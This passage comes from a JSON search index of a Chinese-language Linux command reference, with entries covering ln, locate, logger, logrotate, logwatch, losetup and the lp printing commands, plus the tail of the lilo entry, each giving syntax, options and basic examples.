中， 将得到的选项是 “Linux” 和 “Windows”。输入哪一个，就会引导到哪个 OS。指定加载 Linux 选项，会提示输入一个口令，在本例中是 linux。如果输入的口令有误，则会返回 LILO 提示符。\n\n不幸的是，LILO 不支持引导期间的交互式配置，所以，只能在 lilo.conf 中或者运行`/sbin/lilo`时指定选项。\n\n关于第一次尝试 LILO 的最后一点建议是：我发现使用软盘引导磁盘比使用硬盘实现 LILO 配置更为安全。为此，必须在 lilo.conf 文件中使用`boot=/dev/fd0`替换`boot=/dev/hda`。那样，如果弄乱了lilo.conf文件 中的任何配置，都可以取出引导磁盘并像先前一样引导到 Linux。当使用软盘进行引导一切正常以后，可以将lilo.conf修改回`boot=/dev/hda`，然后最后一次运行`/sbin/lilo`来上传修改。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","lilo"]},{"title":"【Linux 命令】ln","url":"/linux-command/ln/","content":"\n用来为文件创建链接\n\n## 补充说明\n\n**ln命令** 用来为文件创建链接，链接类型分为硬链接和符号链接两种，默认的链接类型是硬链接。如果要创建符号链接必须使用\"-s\"选项。\n\n注意：符号链接文件不是一个独立的文件，它的许多属性依赖于源文件，所以给符号链接文件设置存取权限是没有意义的。\n\n###  语法\n\n```shell\nln [选项]... [-T] 目标 链接名\t(第一种格式)\n　或：ln [选项]... 目标\t\t(第二种格式)\n　或：ln [选项]... 目标... 目录\t(第三种格式)\n　或：ln [选项]... -t 目录 目标...\t(第四种格式)\n```\n\n###  选项\n\n```shell\n    --backup[=CONTROL]  为每个已存在的目标文件创建备份文件\n-b        类似--backup，但不接受任何参数\n-d, -F, --directory   创建指向目录的硬链接(只适用于超级用户)\n-f, --force     强行删除任何已存在的目标文件\n-i, --interactive           覆盖既有文件之前先询问用户\n-L, --logical               取消引用作为符号链接的目标\n-n, --no-dereference        把符号链接的目的目录视为一般文件\n-P, --physical              直接将硬链接到符号链接\n-r, --relative              创建相对于链接位置的符号链接\n-s, --symbolic              对源文件建立符号链接，而非硬链接\n-S, --suffix=SUFFIX         用\"-b\"参数备份目标文件后，备份文件的字尾会被加上一个备份字符串，预设的备份字符串是符号“~”，用户可通过“-S”参数来改变它\n-t, --target-directory=DIRECTORY  指定要在其中创建链接的DIRECTORY\n-T, --no-target-directory   将“LINK_NAME”视为常规文件\n-v, --verbose               打印每个链接文件的名称\n    --help    显示此帮助信息并退出\n    --version   显示版本信息并退出\n```\n\n###  参数\n\n*   源文件：指定链接的源文件。如果使用`-s`选项创建符号链接，则“源文件”可以是文件或者目录。创建硬链接时，则“源文件”参数只能是文件。\n*   目标文件：指定源文件的目标链接文件。\n\n```shell\nnone, off       # 不进行备份(即使使用了--backup 选项)\nnumbered, t     # 备份文件加上数字进行排序\nexisting, nil   # 若有数字的备份文件已经存在则使用数字，否则使用普通方式备份\nsimple, never   # 永远使用普通方式备份\n```\n\n###  实例\n\n将目录`/usr/mengqc/mub1`下的文件m2.c链接到目录`/usr/liu`下的文件a2.c\n\n```shell\ncd /usr/mengqc\nln /mub1/m2.c /usr/liu/a2.c\n```\n\n在执行ln命令之前，目录`/usr/liu`中不存在a2.c文件。执行ln之后，在`/usr/liu`目录中才有a2.c这一项，表明m2.c和a2.c链接起来（注意，二者在物理上是同一文件），利用`ls -l`命令可以看到链接数的变化。\n\n在目录`/usr/liu`下建立一个符号链接文件abc，使它指向目录`/usr/mengqc/mub1`\n\n```shell\nln -s /usr/mengqc/mub1 /usr/liu/abc\n```\n\n执行该命令后，`/usr/mengqc/mub1`代表的路径将存放在名为`/usr/liu/abc`的文件中。\n\n## 扩展知识\n\nLinux具有为一个文件起多个名字的功能，称为链接。被链接的文件可以存放在相同的目录下，但是必须有不同的文件名，而不用在硬盘上为同样的数据重复备份。另外，被链接的文件也可以有相同的文件名，但是存放在不同的目录下，这样只要对一个目录下的该文件进行修改，就可以完成对所有目录下同名链接文件的修改。对于某个文件的各链接文件，我们可以给它们指定不同的存取权限，以控制对信息的共享和增强安全性。\n\n文件链接有两种形式，即硬链接和符号链接。\n\nln功能说明：是为某一个文件在另外一个位置建立一个同步的链接，当我们需要在不同的目录，用到相同的文件时，我们不需要在每一个需要的目录下都放一个必须相同的文件，我们只要在某个固定的目录，放上该文件，然后在其它的目录下用ln命令链接（link）它就可以，不必重复的占用磁盘空间。\n\n> :warning: ln命令会保持每一处链接文件的同步性，也就是说，不论你改动了哪一处，其它的文件都会发生相同的变化。\n\n###  硬链接\n\n建立硬链接时，在另外的目录或本目录中增加目标文件的一个目录项，这样，一个文件就登记在多个目录中。如下所示的m2.c文件就在目录mub1和liu中都建立了目录项。\n\n```shell\nls -ailR\n.:\ntotal 16\n922730 drwxr-xr-x  4 root root 4096 Jun 17 11:18 .\n393217 drwxrwxrwt. 9 root root 4096 Jun 17 11:19 ..\n922733 drwxr-xr-x  2 root root 4096 Jun 17 11:18 liu\n922731 -rw-r--r--  3 root root    0 Jun 17 11:18 m2.c\n922732 drwxr-xr-x  2 root root 4096 Jun 17 11:18 mub1\n\n./liu:\ntotal 8\n922733 drwxr-xr-x 2 root root 4096 Jun 17 11:18 .\n922730 drwxr-xr-x 4 root root 4096 Jun 17 11:18 ..\n922731 -rw-r--r-- 3 root root    0 Jun 17 11:18 m2.c\n\n./mub1:\ntotal 8\n922732 drwxr-xr-x 2 root root 4096 Jun 17 11:18 .\n922730 drwxr-xr-x 4 root root 4096 Jun 17 11:18 ..\n922731 -rw-r--r-- 3 root root    0 Jun 17 11:18 m2.c\n```\n\n创建硬链接后，己经存在的文件的索引节点号（inode）会被多个目录文件项使用。一个文件的硬链接数可以在目录的长列表格式的第二列中看到，无额外链接的文件的链接数为1。\n\n在默认情况下，ln命令创建硬链接。ln命令会增加链接数，rm命令会减少链接数。一个文件除非链接数为0，否则不会从文件系统中被物理地删除。\n\n对硬链接有如下限制：\n\n*   不能对目录文件做硬链接。\n*   不能在不同的文件系统之间做硬链接。就是说，链接文件和被链接文件必须位于同一个文件系统中。\n\n###  符号链接\n\n符号链接也称为软链接，是将一个路径名链接到一个文件。这些文件是一种特别类型的文件。事实上，它只是一个文本文件（如下所示的abc文件），其中包含它提供链接的另一个文件的路径名，如虚线箭头所示。另一个文件是实际包含所有数据的文件。所有读、写文件内容的命令被用于符号链接时，将沿着链接方向前进来访问实际的文件。\n\n```shell\n$ ls -il\ntotal 0\n922736 lrwxrwxrwx 1 root root 5 Jun 17 11:27 abc -> a.txt\n922735 -rw-r--r-- 1 root root 0 Jun 17 11:27 a.txt\n```\n\n与硬链接不同的是，符号链接确实是一个新文件，当然它具有不同的索引节点号；而硬链接并没有建立新文件。\n\n符号链接没有硬链接的限制，可以对目录文件做符号链接，也可以在不同文件系统之间做符号链接。\n\n用`ln -s`命令建立符号链接时，源文件最好用绝对路径名。这样可以在任何工作目录下进行符号链接。而当源文件用相对路径时，如果当前的工作路径与要创建的符号链接文件所在路径不同，就不能进行链接。\n\n符号链接保持了链接与源文件或目录之间的区别：\n\n*   删除源文件或目录，只删除了数据，不会删除链接。一旦以同样文件名创建了源文件，链接将继续指向该文件的新数据。\n*   在目录长列表中，符号链接作为一种特殊的文件类型显示出来，其第一个字母是l。\n*   符号链接的大小是其链接文件的路径名中的字节数。\n*   当用`ls -l`命令列出文件时，可以看到符号链接名后有一个箭头指向源文件或目录，例如`lrwxrwxrwx … 14 jun 20 10:20 /etc/motd->/original_file`其中，表示“文件大小”的数字“14”恰好说明源文件名`original_file`由14个字符构成。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ln"]},{"title":"【Linux 命令】lnstat","url":"/linux-command/lnstat/","content":"\n显示Linux系统的网路状态\n\n## 补充说明\n\n**lnstat命令** 用来显示Linux系统的网路状态。\n\n###  语法\n\n```shell\nlnstat(选项)\n```\n\n###  选项\n\n```shell\n-h：显示帮助信息；\n-V：显示指令版本信息；\n-c：指定显示网络状态的次数，每隔一定时间显示一次网络状态；\n-d：显示可用的文件或关键字；\n-i：指定两次显示网络状的间隔秒数；\n-k：只显示给定的关键字；\n-s：是否显示标题头；\n-w：指定每个字段所占的宽度。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","lnstat"]},{"title":"【Linux 命令】local","url":"/linux-command/local/","content":"\n在函数内定义局部变量。\n\n## 概要\n\n```shell\nlocal [-aAfFgilnrtux] [-p] [name[=value] ...]\n```\n\n## 主要用途\n\n- 在函数内定义局部变量\n- 显示局部变量\n- 在函数内定义全局变量\n\n## 选项\n\n```shell\nlocal命令的选项与declare命令的相同，请参考declare命令的选项。\n```\n\n## 参数\n\nname（可选）：变量名或已定义函数名。\n\nvalue（可选）：变量的值。\n\n## 返回值\n\n`local`返回true除非你提供了非法选项、赋值错误或是在函数外使用`local`命令。\n\n## 例子\n\n```shell\n相关例子请参考declare命令\n```\n\n## 错误用法\n\n- 在函数外使用该命令。\n\n\n### 注意\n\n1. 该命令是bash内建命令，相关的帮助信息请查看`help`命令以及`man bash`、`info bash`的相应部分。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","local"]},{"title":"【Linux 命令】locate","url":"/linux-command/locate/","content":"\n比 find 好用的文件查找工具\n\n## 补充说明\n\nlocate 让使用者可以很快速的搜寻档案系统内是否有指定的档案。其方法是先建立一个包括系统内所有档案名称及路径的数据库，之后当寻找时就只需查询这个数据库，而不必实际深入档案系统之中了。在一般的 distribution 之中，数据库的建立都被放在 crontab 中自动执行。\n\nlocate命令可以在搜寻数据库时快速找到档案，数据库由updatedb程序来更新，updatedb是由cron daemon周期性建立的，locate命令在搜寻数据库时比由整个由硬盘资料来搜寻资料来得快，但较差劲的是locate所找到的档案若是最近才建立或 刚更名的，可能会找不到，在内定值中，updatedb每天会跑一次，可以由修改crontab来更新设定值。(etc/crontab)\n\nlocate指定用在搜寻符合条件的档案，它会去储存档案与目录名称的数据库内，寻找合乎范本样式条件的档案或目录录，可以使用特殊字元（如”*” 或”?”等）来指定范本样式，如指定范本为kcpa*ner, locate 会找出所有起始字串为kcpa且结尾为ner的档案或目录，如名称为kcpartner若目录录名称为kcpa_ner则会列出该目录下包括 子目录在内的所有档案。\n\nlocate指令和find找寻档案的功能类似，但locate是透过update程序将硬盘中的所有档案和目录资料先建立一个索引数据库，在 执行loacte时直接找该索引，查询速度会较快，索引数据库一般是由操作系统管理，但也可以直接下达update强迫系统立即修改索引数据库。\n\n### 语法\n\n```shell\nlocate [选择参数] [样式]\n```\n\n### 选项\n\n```shell\n-b, --basename  # 仅匹配路径名的基本名称\n-c, --count     # 只输出找到的数量\n-d, --database DBPATH # 使用DBPATH指定的数据库，而不是默认数据库 /var/lib/mlocate/mlocate.db\n-e, --existing  # 仅打印当前现有文件的条目\n-1 # 如果 是 1．则启动安全模式。在安全模式下，使用者不会看到权限无法看到 的档案。这会始速度减慢，因为 locate 必须至实际的档案系统中取得档案的  权限资料。\n-0, --null            # 在输出上带有NUL的单独条目\n-S, --statistics      # 不搜索条目，打印有关每个数据库的统计信息\n-q                    # 安静模式，不会显示任何错误讯息。\n-P, --nofollow, -H    # 检查文件存在时不要遵循尾随的符号链接\n-l, --limit, -n LIMIT # 将输出（或计数）限制为LIMIT个条目\n-n                    # 至多显示 n个输出。\n-m, --mmap            # 被忽略，为了向后兼容\n-r, --regexp REGEXP   # 使用基本正则表达式\n    --regex           # 使用扩展正则表达式\n-q, --quiet           # 安静模式，不会显示任何错误讯息\n-s, --stdio           # 被忽略，为了向后兼容\n-o                    # 指定资料库存的名称。\n-h, --help            # 显示帮助\n-i, --ignore-case     # 忽略大小写\n-V, --version         # 显示版本信息\n```\n\n### 实例\n\n实例1：查找和pwd相关的所有文件\n\n```shell\nroot ~ # locate pwd\n/bin/pwd\n/etc/.pwd.lock\n/sbin/unix_chkpwd\n/usr/bin/pwdx\n/usr/include/pwd.h\n/usr/lib/python2.7/dist-packages/twisted/python/fakepwd.py\n/usr/lib/python2.7/dist-packages/twisted/python/fakepwd.pyc\n/usr/lib/python2.7/dist-packages/twisted/python/test/test_fakepwd.py\n/usr/lib/python2.7/dist-packages/twisted/python/test/test_fakepwd.pyc\n/usr/lib/syslinux/pwd.c32\n/usr/share/help/C/empathy/irc-join-pwd.page\n/usr/share/help/ca/empathy/irc-join-pwd.page\n/usr/share/help/cs/empathy/irc-join-pwd.page\n/usr/share/help/de/empathy/irc-join-pwd.page\n/usr/share/help/el/empathy/irc-join-pwd.page\n```\n\n实例2： 搜索etc目录下所有以sh开头的文件\n\n```shell\nroot ~ # locate /etc/sh\n/etc/shadow\n/etc/shadow-\n/etc/shells\n```\n\n实例3：搜索etc目录下，所有以m开头的文件\n\n```shell\nroot ~ # locate /etc/m\n/etc/magic\n/etc/magic.mime\n/etc/mailcap\n/etc/mailcap.order\n/etc/manpath.config\n/etc/mate-settings-daemon\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","locate"]},{"title":"【Linux 命令】logger","url":"/linux-command/logger/","content":"\n在系统日志中记录相应条目\n\n## 补充说明\n\n**logger命令** 是用于往系统中写入日志，他提供一个shell命令接口到syslog系统模块\n\n###  语法\n\n```shell\nlogger [options] [message]\n```\n\n###  选项\n\n```shell\n -T, --tcp             使用流连接(TCP)\n -d, --udp             使用数据报(UDP)\n -i, --id              逐行记录每一次logger的进程ID\n -f, --file <file>     记录特定的文件\n -h, --help            显示帮助文本并退出\n -n, --server <name>   写入指定的远程syslog服务器，使用UDP代替内装式syslog的例程\n -P, --port <port>     使用指定的UDP端口。默认的端口号是514\n -p, --priority <prio> 指定输入消息的优先级，优先级可以是数字或者指定为 \" facility.level\" 的格式。\n                       比如：\" -p local3.info \" local3 这个设备的消息级别为 info。\n                       默认级别是 \"user.notice\"\n -s, --stderr          输出标准错误到系统日志。\n -t, --tag <tag>       指定标记记录\n -u, --socket <socket> 写入指定的socket，而不是到内置系统日志例程。\n -V, --version         输出版本信息并退出\n```\n\n### 例子\n\n```shell\nlogger -p syslog.info \"backup.sh is starting\"\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","logger"]},{"title":"【Linux 命令】login","url":"/linux-command/login/","content":"\n登录系统或切换用户身份\n\n## 补充说明\n\n**login命令** 用于给出登录界面，可用于重新登录或者切换用户身份，也可通过它的功能随时更换登入身份。在Slackware发行版中 ，您可在命令后面附加欲登入的用户名称，它会直接询问密码，等待用户输入。当`/etc/nologin`文件存在时，系统只root帐号登入系统，其他用户一律不准登入。\n\n###  语法\n\n```shell\nlogin(选项)(参数)\n```\n\n###  选项\n\n```shell\n-p：告诉login指令不销毁环境变量；\n-h：指定远程服务器的主机名。\n```\n\n###  参数\n\n用户名：指定登录使用的用户名。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","login"]},{"title":"【Linux 命令】logname","url":"/linux-command/logname/","content":"\n打印当前终端登录用户的名称。\n\n## 概要\n\n```shell\nlogname [OPTION]...\n```\n\n## 主要用途\n\n- 打印当前终端登录用户的名称。\n\n## 选项\n\n```shell\n--help       显示帮助信息并退出。\n--version    显示版本信息并退出。\n```\n\n## 返回值\n\n返回0表示成功，返回非0值表示失败。\n\n## 例子\n\n```shell\n[root@localhost ~]# logname\nroot\n```\n\n### 注意\n\n1. 注意区分 `whoami` 和 `logname` 这两个命令；比如我们以用户 `root` 打开的终端，然后切换到了用户 `user2`。此时， `whoami`返回的是当前用户 `user2`, `logname` 返回的是 `root`，大家可以自行实践验证一下。\n\n2. 该命令是`GNU coreutils`包中的命令，相关的帮助信息请查看`man -s 1 logname`，`info coreutils 'logname invocation'`。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","logname"]},{"title":"【Linux 命令】logout","url":"/linux-command/logout/","content":"\n退出当前登录的Shell\n\n## 补充说明\n\n**logout命令** 用于退出当前登录的Shell，logout指令让用户退出系统，其功能和login指令相互对应。\n\n###  语法\n\n```shell\nlogout\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","logout"]},{"title":"【Linux 命令】logrotate","url":"/linux-command/logrotate/","content":"\n系统日志进行轮转、压缩和删除\n\n## 补充说明\n\n**logrotate命令** 用于对系统日志进行轮转、压缩和删除，也可以将日志发送到指定邮箱。使用logrotate指令，可让你轻松管理系统所产生的记录文件。每个记录文件都可被设置成每日，每周或每月处理，也能在文件太大时立即处理。您必须自行编辑，指定配置文件，预设的配置文件存放在`/etc/logrotate.conf`文件中。\n\n###  语法\n\n```shell\nlogrotate(选项)(参数)\n```\n\n###  选项\n\n```shell\n-?或--help：在线帮助；\n-d或--debug：详细显示指令执行过程，便于排错或了解程序执行的情况；\n-f或--force ：强行启动记录文件维护操作，纵使logrotate指令认为没有需要亦然；\n-s<状态文件>或--state=<状态文件>：使用指定的状态文件；\n-v或--version：显示指令执行过程；\n-usage：显示指令基本用法。\n```\n\n###  参数\n\n配置文件：指定lograote指令的配置文件。\n\n###  实例\n\ncrontab 会定时调用logrotate命令 在 `/etc/cron.daily/logrotate` 文件中配置使用\n\nlogrotate的配置文件`/etc/logrotate.conf` 定义引用`/etc/logrotate.d`目录下的一些自定义的log配置 \n\n在`/etc/logrotate.d`目录下创建任意后缀名的文件,即可使用对日志进行轮转\n```shell\n/tmp/log/log.txt\n{\n    copytruncate\n    daily\n    rotate 30\n    missingok\n    ifempty\n    compress\n    noolddir\n}\n```\n\n这个配置文件代表的意思是将`/tmp/log/log.txt`文件 进行轮转压缩\n\n```\ncompress                 通过gzip 压缩转储以后的日志\nnocompress               不做gzip压缩处理\ncopytruncate             用于还在打开中的日志文件，把当前日志备份并截断；是先拷贝再清空的方式，拷贝和清空之间有一个时间差，可能会丢失部分日志数据。\nnocopytruncate 备份日志文件不过不截断\ncreate mode owner group  轮转时指定创建新文件的属性，如create 0777 nobody nobody\nnocreate                 不建立新的日志文件\ndelaycompress            和compress 一起使用时，转储的日志文件到下一次转储时才压缩\nnodelaycompress          覆盖 delaycompress 选项，转储同时压缩\nmissingok                如果日志丢失，不报错继续滚动下一个日志\nerrors address           专储时的错误信息发送到指定的Email 地址\nifempty                  即使日志文件为空文件也做轮转，这个是logrotate的缺省选项。\nnotifempty               当日志文件为空时，不进行轮转\nmail address             把转储的日志文件发送到指定的E-mail 地址\nnomail                   转储时不发送日志文件\nolddir directory         转储后的日志文件放入指定的目录，必须和当前日志文件在同一个文件系统\nnoolddir                 转储后的日志文件和当前日志文件放在同一个目录下\nsharedscripts            运行postrotate脚本，作用是在所有日志都轮转后统一执行一次脚本。如果没有配置这个，那么每个日志轮转后都会执行一次脚本\nprerotate                在logrotate转储之前需要执行的指令，例如修改文件的属性等动作；必须独立成行\npostrotate               在logrotate转储之后需要执行的指令，例如重新启动 (kill -HUP) 某个服务！必须独立成行\ndaily                    指定转储周期为每天\nweekly                   指定转储周期为每周\nmonthly                  指定转储周期为每月\nrotate count             指定日志文件删除之前转储的次数，0 指没有备份，5 指保留5 个备份\ndateext                  使用当期日期作为命名格式\ndateformat .%s           配合dateext使用，紧跟在下一行出现，定义文件切割后的文件名，必须配合dateext使用，只支持 %Y %m %d %s 这四个参数\nsize(或minsize) log-size 当日志文件到达指定的大小时才转储\n```\n### 注意事项\n\n在`/etc/logrotate.d`目录下创建任意后缀名的文件\n```shell\n/tmp/log/log*\n{\n    copytruncate\n    daily\n    rotate 30\n    missingok\n    ifempty\n    compress\n    noolddir\n}\n```\n这种情况下，会将轮转过的log再重新轮转,因为轮转过后的文件名也是已log开头的\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","logrotate"]},{"title":"【Linux 命令】logsave","url":"/linux-command/logsave/","content":"\n将命令的输出信息保存到指定的日志文件\n\n## 补充说明\n\n**logsave命令** 运行给定的命令，并将命令的输出信息保存到指定的日志文件中。\n\n###  语法\n\n```shell\nlogsave(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a：追加信息到指定的日志文件中。\n```\n\n###  参数\n\n*   日志文件：指定记录运行信息的日志文件；\n*   指令：需要执行的指令。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","logsave"]},{"title":"【Linux 命令】logwatch","url":"/linux-command/logwatch/","content":"\n可定制和可插入式的日志监视系统\n\n## 补充说明\n\n**logwatch命令** 是一个可定制和可插入式的日志监视系统，它通过遍历给定时间范围内的系统日志文件而产生日志报告。logwatch默认每天执行一次，可以从`/etc/cron.daily`里看到。\n\n###  语法\n\n```shell\nlogwatch(选项)\n```\n\n###  选项\n\n```shell\n--detail<报告详细程度>：指定日志报告的详细程度；\n--logfile<日志文件>：仅处理指定的日志文件；\n--service<服务名>：仅处理指定服务的日志文件；\n--print：打印结果到标准输出；\n--mailto<邮件地址>：将结果发送到指定邮箱；\n--range<日期范围>：指定处理日志的日期范围；\n--archives：处理归档日志文件；\n--debug<调试等级>：调试模式；\n--save<文件名>：将结果保存到指定文件中，而不显示或者发送到指定邮箱；\n--logdir<目录>：指定查找日志文件的目录，而不使用默认的日志目录；\n--hostname<主机名>：指定在日志报告中使用的主机名，不使用系统默认的主机名；\n--numeric：在报告中显示ip地址而不是主机名；\n--help：显示指令的帮助信息。\n```\n\n###  实例\n\n检查你的主机上是否已经存在Logwatch（Redhat默认已经安装了Logwatch，不过版本比较旧）：\n\n```shell\nrpm -qa logwatch\n```\n\n如果主机上没有logwatch，则执行：\n\n```shell\nrpm -Ivh logwatch***.rpm\n```\n\n如果有老版本的logwatch，则执行：\n\n```shell\nrpm -Uvh logwatch***.rpm\n```\n\n安装完毕后，开始配置：\n\n可以修改和添加它的logfiles、services和其他配置，但默认已经有很多脚本了，只要在1）里设置`Detail = High`就可以了。\n\n*   可以添加新的配置到`/etc/logwatch/conf/logwatch.conf`\n*   也可以修改`/usr/share/logwatch/default.conf/logwatch.conf`\n\n`/etc/logwatch/conf/`会自动覆盖`/usr/share/logwatch/default.conf/`下的同名文件。\n\n如果没有设置logwatch.conf也没关系，可以直接在命令行下设置。\n\n```shell\nlogwatch --detail High --Service All --range All --print    基本就可以显示出所有日志的情况了\nlogwatch --service sshd --detail High                       只看sshd的日志情况\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","logwatch"]},{"title":"【Linux 命令】look","url":"/linux-command/look/","content":"\n显示文件中以指定字符串开头的任意行\n\n## 补充说明\n\n**look命令** 用于显示文件中以指定字符串开头的任意行。\n\n###  语法\n\n```shell\nlook(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a：使用另一个字典文件web2，该文件也位于/usr/dict目录下；\n-d：只对比英文字母和数字，其余一概忽略不予比对；\n-f：忽略字符大小写差别；\n-t<字尾字符串>：设置字尾字符串。\n```\n\n###  参数\n\n*   字符串：指定要查找的字符串；\n*   文件：指定要查找的目标文件。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","look"]},{"title":"【Linux 命令】losetup","url":"/linux-command/losetup/","content":"\n设定与控制循环（loop）设备\n\n## 补充说明\n\n**losetup命令** 用来设置循环设备。循环设备可把文件虚拟成块设备，籍此来模拟整个文件系统，让用户得以将其视为硬盘驱动器，光驱或软驱等设备，并挂入当作目录来使用。\n\n###  语法\n\n```shell\nlosetup [ -e encryption ] [ -o offset ] loop_device file\nlosetup [ -d ] loop_device\n```\n\n###  选项\n\n```shell\n-a 显示所有循环设备的状态。\n-d 卸除设备。\n-e <加密选项> 启动加密编码 。\n-f 寻找第一个未使用的循环设备。\n-o <偏移量>设置数据偏移量，单位是字节。\n```\n\n###  参数\n\n*   loop_device：循环设备可以是/dev/loop0, /dev/loop1 ... /dev/loop7。\n*   file：要与循环设备相关联的文件名，这个往往是一个磁盘镜象文件，如 *.img\n\n###  loop设备介绍\n\n在类 UNIX 系统里，loop 设备是一种伪设备(pseudo-device)，或者也可以说是仿真设备。它能使我们像块设备一样访问一个文件。在使用之前，一个 loop 设备必须要和一个文件进行连接。这种结合方式给用户提供了一个替代块特殊文件的接口。因此，如果这个文件包含有一个完整的文件系统，那么这个文件就可以像一个磁盘设备一样被 mount 起来。\n\n上面说的文件格式，我们经常见到的是 cd 或 DVD 的 ISO 光盘镜像文件或者是软盘(硬盘)的 *.img 镜像文件。通过这种 loop mount (回环mount)的方式，这些镜像文件就可以被 mount 到当前文件系统的一个目录下。\n\n至此，顺便可以再理解一下 loop 之含义：对于第一层文件系统，它直接安装在我们计算机的物理设备之上；而对于这种被 mount 起来的镜像文件(它也包含有文件系统)，它是建立在第一层文件系统之上，这样看来，它就像是在第一层文件系统之上再绕了一圈的文件系统，所以称为 loop。\n\n###  实例\n\n创建空的磁盘镜像文件，这里创建一个1.44M的软盘：\n\n```shell\ndd if=/dev/zero of=floppy.img bs=512 count=2880\n```\n\n使用 losetup将磁盘镜像文件虚拟成快设备：\n\n```shell\nlosetup /dev/loop1 floppy.img\n```\n\n挂载块设备：\n\n```shell\nmount /dev/loop0 /tmp\n```\n\n经过上面的三步之后，我们就可以通过/tmp目录，像访问真实快设备一样来访问磁盘镜像文件floppy.img。\n\n卸载loop设备：\n\n```shell\numount /tmp\nlosetup -d /dev/loop1\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","losetup"]},{"title":"【Linux 命令】lp","url":"/linux-command/lp/","content":"\n打印文件或修改排队的打印任务\n\n## 补充说明\n\n**lp命令** 用于打印文件，或者修改排队的打印任务。与lpr命令类似，lp命令既支持文件输入也支持标准输入。它与lpr的不同之处在于它有一个不同（稍微复杂点）的参数选项设置。\n\n###  语法\n\n```shell\nlp(选项)(参数)\n```\n\n###  选项\n\n```shell\n-E：与打印服务器连接时强制使用加密；\n-U：指定连接打印服务器时使用的用户名；\n-d：指定接收打印任务的目标打印机；\n-i：指定一个存在的打印任务号；\n-m：打印完成时发送E-mail；\n-n：指定打印的份数；\n-t：指定打印任务的名称；\n-H：指定打印任务开始的时间；\n-P：指定需要打印的页码。\n```\n\n###  参数\n\n文件：需打印的文件。\n\n###  实例\n\n要在连接在设备dlp0上的打印机lp0上打印文件`/etc/motd`，请输入：\n\n```shell\nlp /etc/motd\n```\n\n要使用文件的一个副本打印`/etc/motd`文件的30个副本，并且要用邮件通知用户作业完成，请输入：\n\n```shell\nlp -c -m -n30 -dlp0:lpd0 /etc/motd\n```\n\n要使用后端标志-f和-a并带上作业标题blah打印`/etc/motd`文件，请输入：\n\n```shell\nlp -t \"blah\" -o -f -o -a /etc/motd\n```\n\n要排队MyFile文件并返回作业编号，请输入：\n\n```shell\nlp myfile\n```\n\n要排队MyFile文件并禁止作业编号，请输入：\n\n```shell\nlp -s myfile\n```\n\n **退出状态** \n\n该命令返回以下退出值：\n\n*   0：所有输入文件成功处理。\n*   >0：没有输出设备可用，或者出现一个错误。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","lp"]},{"title":"【Linux 命令】lpadmin","url":"/linux-command/lpadmin/","content":"\n配置CUPS套件中的打印机和类\n\n## 补充说明\n\n**lpadmin命令** 用于配置CUPS套件中的打印机和类，也被用来设置打印服务器默认打印机。\n\n###  语法\n\n```shell\nlpadmin(选项)(参数)\n```\n\n###  选项\n\n```shell\n-c：将打印机加入类；\n-i：为打印机设置“system V”风格的接口脚本；\n-m：从mode目录设置一个标准的“system V”接口脚本或“PPD”文件；\n-o：为“PPD”或服务器设置选项；\n-r：从类中删除打印机；\n-u：设置打印机用户级的访问控制；\n-D：为打印机提供一个文字描述；\n-E：允许打印机接受打印任务；\n-L：为打印机位置提供一个文字描述；\n-P：为打印机指定一个ppd描述文件；\n-p：指定要配置的打印机名称；\n-d：设置默认打印机。\n```\n\n###  参数\n\n打印机：指定要配置的打印机的名称。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","lpadmin"]},{"title":"【Linux 命令】lpc","url":"/linux-command/lpc/","content":"\n命令行方式打印机控制程序\n\n## 补充说明\n\n**lpc命令** 式命令行方式打印机控制程序，有5个内置命令。\n\n###  语法\n\n```shell\nlpc\n```\n\n###  实例\n\n```shell\n[root@localhost ~]# lpc\nlpc> ?         \n命令可能是缩写。命令是：\n\nexit    help    quit    status  ?\nlpc> exit\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","lpc"]},{"title":"【Linux 命令】lpq","url":"/linux-command/lpq/","content":"\n显示打印队列中的打印任务的状态信息\n\n## 补充说明\n\n**lpq命令** 用于显示打印队列中的打印任务的状态信息。\n\n### 语法\n\n```shell\nlpq(选项)\n```\n\n### 选项\n\n```shell\n-E：强制使用加密方式与服务器连接；\n-P：显示中的打印机上的打印队列状态；；\n-U：自动可选的用户名；\n-a：报告所有打印机的定义任务；\n-h：指定打印服务器信息；\n-l：使用长格式输出；\n+：指定显示状态的间隔时间。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","lpq"]},{"title":"【Linux 命令】lpr","url":"/linux-command/lpr/","content":"\n将文件发送给指定打印机进行打印\n\n## 补充说明\n\n**lpr命令** 用于将文件发送给指定打印机进行打印，如果不指定目标打印机，则使用默认打印机。\n\n###  语法\n\n```shell\nlpr(选项)(参数)\n```\n\n###  选项\n\n```shell\n-E：与打印服务器连接时强制使用加密；\n-H：指定可选的打印服务器；\n-C：指定打印任务的名称；\n-P：指定接受打印任务的目标打印机；\n-U：指定可选的用户名；\n-#：指定打印的份数；\n-h：关闭banner打印；\n-m：打印完成后发送E-mail；\n-r：打印完成后删除文件。\n```\n\n###  参数\n\n文件：需打印的文件。\n\n###  实例\n\n将man1和man2送到打印机lp进行打印：\n\n```shell\nlpr -P lp man1 man2\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","lpr"]},{"title":"【Linux 